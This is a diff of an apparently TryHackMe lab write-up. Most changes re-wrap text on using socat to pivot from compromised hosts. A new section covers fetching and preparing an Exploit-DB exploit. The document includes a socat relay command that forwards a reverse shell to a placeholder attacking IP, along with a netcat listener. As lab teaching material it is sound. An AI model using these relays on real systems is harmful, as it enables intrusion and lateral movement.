@@ -657,16 +657,16 @@
 
 ***[Task 13]: Pivoting Socat***
 
-   Socat is not just great for fully stable Linux shells[1], it's also superb for port forwarding. The one big disadvantage of socat (aside from the frequent problems people        have learning the syntax), is that it is very rarely installed by default on a target. That said, static binaries are easy to find for both Linux and Windows. Bear in mind      that the Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required. Before we begin, it's worth noting: if you have completed    the What the Shell? room, you will know that socat can be used to create encrypted connections. The techniques shown here could be combined with the encryption options          detailed in the shells room to create encrypted port forwards and relays. To avoid overly complicating this section, this technique will not be taught here; however, it's        well worth experimenting with this in your own time.
+   Socat is not just great for fully stable Linux shells[1], it's also superb for port forwarding. The one big disadvantage of socat (aside from the frequent problems people      have learning the syntax), is that it is very rarely installed by default on a target. That said, static binaries are easy to find for both Linux and Windows. Bear in mind      that the Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required. Before we begin, it's worth noting: if you have            completed the What the Shell? room, you will know that socat can be used to create encrypted connections. The techniques shown here could be combined with the encryption        options detailed in the shells room to create encrypted port forwards and relays. To avoid overly complicating this section, this technique will not be taught here; however,    it's  well worth experimenting with this in your own time.
 
-   Whilst the following techniques could not be used to set up a full proxy into a target network, it is quite possible to use them to successfully forward ports from both Linux    and Windows compromised targets. In particular, socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct          connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the target and    then forwards it immediately back to the attacking box:
+   Whilst the following techniques could not be used to set up a full proxy into a target network, it is quite possible to use them to successfully forward ports from both        Linux and Windows compromised targets. In particular, socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a          direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the      target and then forwards it immediately back to the attacking box:
 
 
    ![image](https://user-images.githubusercontent.com/68686150/114981801-2ce99080-9eac-11eb-9512-b240b5292ee5.png)
 
-   It's best to think of socat as a way to join two things together -- kind of like the Portal Gun in the Portal games, it creates a link between two different locations. This      could be two ports on the same machine, it could be to create a relay between two different machines, it could be to create a connection between a port and a file on the        listening machine, or many other similar things. It is an extremely powerful tool, which is well worth looking into in your own time.
+   It's best to think of socat as a way to join two things together -- kind of like the Portal Gun in the Portal games, it creates a link between two different locations. This    could be two ports on the same machine, it could be to create a relay between two different machines, it could be to create a connection between a port and a file on the        listening machine, or many other similar things. It is an extremely powerful tool, which is well worth looking into in your own time.
 
-   Generally speaking, however, hackers tend to use it to either create reverse/bind shells, or, as in the example above, create a port forward. Specifically, in the above          example we're creating a port forward from a port on the compromised server to a listening port on our own box. We could do this the other way though, by either forwarding a    connection from the attacking machine to a target inside the network, or creating a direct link between a listening port on the attacking machine with the service on the        internal server. This latter application is especially useful as it does not require opening a port on the compromised server.
+   Generally speaking, however, hackers tend to use it to either create reverse/bind shells, or, as in the example above, create a port forward. Specifically, in the above        example we're creating a port forward from a port on the compromised server to a listening port on our own box. We could do this the other way though, by either forwarding a    connection from the attacking machine to a target inside the network, or creating a direct link between a listening port on the attacking machine with the service on the        internal server. This latter application is especially useful as it does not require opening a port on the compromised server.
 
    Before using socat, it will usually be necessary to download a binary for it, then upload it to the box.
 
@@ -686,7 +686,7 @@
 
    Reverse Shell Relay:
 
-   In this scenario we are using socat to create a relay for us to send a reverse shell back to our own attacking machine (as in the diagram above). First let's start a standard    netcat listener on our attacking box (sudo nc -lvnp 443). Next, on the compromised server, use the following command to start the relay:
+   In this scenario we are using socat to create a relay for us to send a reverse shell back to our own attacking machine (as in the diagram above). First let's start a            standard netcat listener on our attacking box (sudo nc -lvnp 443). Next, on the compromised server, use the following command to start the relay:
    ./socat tcp-l:8000 tcp:ATTACKING_IP:443 &
 
    Note: the order of the two addresses matters here. Make sure to open the listening port first, then connect back to the attacking machine.
@@ -1013,16 +1013,36 @@
   ![image](https://user-images.githubusercontent.com/68686150/115670532-25702e80-a367-11eb-9feb-122d9830a9af.png)
 
 
+***[Task 19]: Git Server Code Review***
+
+   In the previous task we found an exploit that might work against the service running on the second server.
+
+   Make a copy of this exploit in your local directory using the command:
 
 
+       searchsploit -m EDBID
+      
+   Unfortunately, the local exploit copies stored by searchsploit use DOS line endings, which can cause problems in scripts when executed on Linux:
 
+   Before we can use the exploit, we must convert these into Linux line endings using the dos2unix tool:
 
+      dos2unix ./EDBID.py
 
+   This  can also be done manually with sed if dos2unix is unavailable:
 
+      sed -i 's/\r//' ./EDBID.py
 
+   With the file converted, it's time to read through the exploit to make sure we know what it's doing. The fact that the exploit is on Exploit-DB means that it's unlikely to      be outright malicious, but there's no guarantee that it will work, or do anything close to exploiting a vulnerabilty in the service.
 
+   Open the exploit in your favourite text editor and let's get going!
 
+   ![image](https://user-images.githubusercontent.com/68686150/115826245-359c1280-a428-11eb-91b6-6bb3dd8e5739.png)
 
+   ![image](https://user-images.githubusercontent.com/68686150/115826313-506e8700-a428-11eb-8fc7-e1d373475c8e.png)
+ 
+   We are, however, interested in the last 6 lines of the exploit:
+ 
+  "https://assets.tryhackme.com/additional/wreath-network/0c95035c81e7.png"
 
 
 
